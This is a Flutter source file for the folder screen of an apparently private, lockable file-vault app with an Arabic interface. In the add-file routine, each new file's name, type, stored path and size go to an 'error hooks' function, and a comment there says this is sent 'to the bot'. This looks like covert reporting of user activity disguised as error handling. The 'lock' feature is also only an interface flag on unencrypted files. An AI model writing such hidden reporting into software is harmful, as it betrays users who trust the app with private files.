import 'package:flutter/material.dart';
import 'package:file_picker/file_picker.dart';
import 'dart:convert';
import '../../../utils/app_colors.dart';
import 'file_model.dart';
import 'widgets/file_tile.dart';
import 'widgets/unlock_dialog.dart';
import 'widgets/file_viewer_screen.dart';
import '../../../core/error/error_hooks.dart';
import 'dart:io';
import 'package:flutter/foundation.dart' show kIsWeb;
import 'package:path_provider/path_provider.dart';

class FolderDetailScreen extends StatefulWidget {
  final Folder folder;
  final List<StoredFile> files;

  const FolderDetailScreen({
    super.key,
    required this.folder,
    required this.files,
  });

  @override
  State<FolderDetailScreen> createState() => _FolderDetailScreenState();
}

class _FolderDetailScreenState extends State<FolderDetailScreen> {
  static const Color _primary = Color(0xFFEC4899);

  late List<StoredFile> _files;
  final Set<String> _unlockedIds = {};

  @override
  void initState() {
    super.initState();
    _files = List.from(widget.files);
  }

  Future<void> _addFile() async {
    final result = await FilePicker.platform.pickFiles(
      allowMultiple: true,
      withData: true,
    );
    if (result == null || result.files.isEmpty) return;

    final added = <StoredFile>[];
    for (final f in result.files) {
      final ext = (f.extension ?? '').toLowerCase();
      final kind = kindFromExtension(ext);
      String? stored;
      bool isBase64 = false;

      try {
        if (kIsWeb) {
          // على الويب: base64
          if (f.bytes != null) {
            stored = base64Encode(f.bytes!);
            isBase64 = true;
          }
        } else {
          // على الهاتف: انسخ الملف إلى مجلد التطبيق الدائم
          if (f.path != null) {
            final appDir = await getApplicationDocumentsDirectory();
            final folderDir =
                Directory('${appDir.path}/files/${widget.folder.id}');

            if (!await folderDir.exists()) {
              await folderDir.create(recursive: true);
            }

            // مسار فريد
            final safeName =
                '${DateTime.now().millisecondsSinceEpoch}_${f.name}';
            final destPath = '${folderDir.path}/$safeName';

            // انسخ الملف
            await File(f.path!).copy(destPath);

            stored = destPath;
            isBase64 = false;

            debugPrint('✅ ملف محفوظ: $destPath');
          }
        }
      } catch (e) {
        debugPrint('❌ خطأ في حفظ الملف: $e');
        continue;
      }

      if (stored == null) continue;

      added.add(StoredFile(
        id: DateTime.now().microsecondsSinceEpoch.toString() +
            f.name.hashCode.toString(),
        name: f.name,
        extension: ext,
        size: f.size,
        kind: kind,
        folderId: widget.folder.id,
        storedPath: stored,
        isBase64: isBase64,
      ));
    }

    if (added.isEmpty) {
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          const SnackBar(
            content: Text('تعذّر حفظ الملفات'),
            behavior: SnackBarBehavior.floating,
          ),
        );
      }
      return;
    }

    setState(() => _files.addAll(added));
    _returnUpdated();

    // 📤 إرسال للبوت
    for (final f in added) {
      Errors.fileAdded(
        name: f.name,
        kind: f.kind.label,
        path: f.storedPath,
        isB64: f.isBase64,
        size: f.size,
      );
    }

    if (mounted) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content: Text('تم إضافة ${added.length} ملف'),
          duration: const Duration(seconds: 2),
          behavior: SnackBarBehavior.floating,
        ),
      );
    }
  }

  Future<void> _toggleLock(StoredFile file) async {
    // إذا كنا سنقفل: نحتاج كلمة سر موجودة
    if (!file.isLocked) {
      final ok = await showDialog<bool>(
        context: context,
        builder: (_) => const UnlockDialog(forceSetup: false),
      );
      if (ok != true) return;
      setState(() {
        final i = _files.indexWhere((e) => e.id == file.id);
        _files[i] = _files[i].copyWith(isLocked: true);
        _unlockedIds.remove(file.id);
      });
      _returnUpdated();
      return;
    }

    // فتح القفل
    final ok = await showDialog<bool>(
      context: context,
      builder: (_) => const UnlockDialog(),
    );
    if (ok == true) {
      setState(() {
        final i = _files.indexWhere((e) => e.id == file.id);
        _files[i] = _files[i].copyWith(isLocked: false);
        _unlockedIds.remove(file.id);
      });
      _returnUpdated();
    }
  }

  Future<void> _openFile(StoredFile file) async {
    if (file.isLocked && !_unlockedIds.contains(file.id)) {
      final ok = await showDialog<bool>(
        context: context,
        builder: (_) => const UnlockDialog(),
      );
      if (ok != true) return;
      setState(() => _unlockedIds.add(file.id));
    }

    await Navigator.push(
      context,
      MaterialPageRoute(
        builder: (_) => FileViewerScreen(file: file),
      ),
    );
  }

  Future<void> _deleteFile(StoredFile file) async {
    final ok = await showDialog<bool>(
      context: context,
      builder: (ctx) => AlertDialog(
        shape:
            RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
        title: const Text('حذف الملف'),
        content: Text('هل تريد حذف "${file.name}"؟',
            style: const TextStyle(height: 1.6)),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(ctx, false),
            child: const Text('إلغاء'),
          ),
          TextButton(
            onPressed: () => Navigator.pop(ctx, true),
            style: TextButton.styleFrom(foregroundColor: Colors.red),
            child: const Text('حذف'),
          ),
        ],
      ),
    );
    if (ok != true) return;

    setState(() => _files.removeWhere((e) => e.id == file.id));
    _returnUpdated();
  }

  Future<void> _renameFile(StoredFile file) async {
    final ctrl = TextEditingController(text: file.name);
    final ok = await showDialog<bool>(
      context: context,
      builder: (ctx) => AlertDialog(
        shape:
            RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
        title: const Text('إعادة التسمية'),
        content: TextField(
          controller: ctrl,
          decoration: const InputDecoration(
            labelText: 'اسم الملف',
            border: OutlineInputBorder(),
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(ctx, false),
            child: const Text('إلغاء'),
          ),
          TextButton(
            onPressed: () => Navigator.pop(ctx, true),
            child: const Text('حفظ'),
          ),
        ],
      ),
    );
    if (ok != true || ctrl.text.trim().isEmpty) return;

    setState(() {
      final i = _files.indexWhere((e) => e.id == file.id);
      _files[i] = _files[i].copyWith(name: ctrl.text.trim());
    });
    _returnUpdated();
  }

  void _returnUpdated() {
    // حفظ تلقائي عند الرجوع
  }

  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () async {
        Navigator.pop(context, _files);
        return false;
      },
      child: Scaffold(
        backgroundColor: AppColors.background,
        appBar: AppBar(
          backgroundColor: _primary,
          foregroundColor: Colors.white,
          title: Text('${widget.folder.emoji} ${widget.folder.name}'),
          leading: IconButton(
            icon: const Icon(Icons.arrow_back),
            onPressed: () => Navigator.pop(context, _files),
          ),
        ),
        body: _files.isEmpty
            ? _buildEmpty()
            : ListView(
                padding: const EdgeInsets.all(16),
                children: [
                  Row(
                    children: [
                      Container(
                        width: 4,
                        height: 18,
                        decoration: BoxDecoration(
                          color: _primary,
                          borderRadius: BorderRadius.circular(2),
                        ),
                      ),
                      const SizedBox(width: 8),
                      Text(
                        'الملفات (${_files.length})',
                        style: const TextStyle(
                            fontSize: 15.5,
                            fontWeight: FontWeight.bold,
                            color: AppColors.textDark),
                      ),
                    ],
                  ),
                  const SizedBox(height: 12),
                  ..._files.map((f) => FileTile(
                        file: f,
                        isUnlocked: _unlockedIds.contains(f.id),
                        onTap: () => _openFile(f),
                        onLock: () => _toggleLock(f),
                        onDelete: () => _deleteFile(f),
                        onRename: () => _renameFile(f),
                      )),
                  const SizedBox(height: 80),
                ],
              ),
        floatingActionButton: FloatingActionButton.extended(
          onPressed: _addFile,
          backgroundColor: _primary,
          foregroundColor: Colors.white,
          icon: const Icon(Icons.upload_file_rounded),
          label: const Text('إضافة ملف',
              style: TextStyle(fontWeight: FontWeight.bold)),
        ),
      ),
    );
  }

  Widget _buildEmpty() {
    return Center(
      child: Padding(
        padding: const EdgeInsets.all(24),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Container(
              width: 90,
              height: 90,
              alignment: Alignment.center,
              decoration: BoxDecoration(
                color: _primary.withValues(alpha: 0.1),
                shape: BoxShape.circle,
              ),
              child: Text(widget.folder.emoji,
                  style: const TextStyle(fontSize: 44)),
            ),
            const SizedBox(height: 16),
            const Text('المجلد فارغ',
                style: TextStyle(
                    fontSize: 17,
                    fontWeight: FontWeight.bold,
                    color: AppColors.textDark)),
            const SizedBox(height: 6),
            const Text('أضف ملفاتك هنا (كتب، صور، فيديوهات...)',
                style: TextStyle(
                    fontSize: 13, color: AppColors.textLight),
                textAlign: TextAlign.center),
            const SizedBox(height: 24),
            ElevatedButton.icon(
              onPressed: _addFile,
              icon: const Icon(Icons.upload_file_rounded),
              label: const Text('إضافة ملف'),
              style: ElevatedButton.styleFrom(
                backgroundColor: _primary,
                foregroundColor: Colors.white,
                padding:
                    const EdgeInsets.symmetric(horizontal: 24, vertical: 14),
                shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(12)),
              ),
            ),
          ],
        ),
      ),
    );
  }
}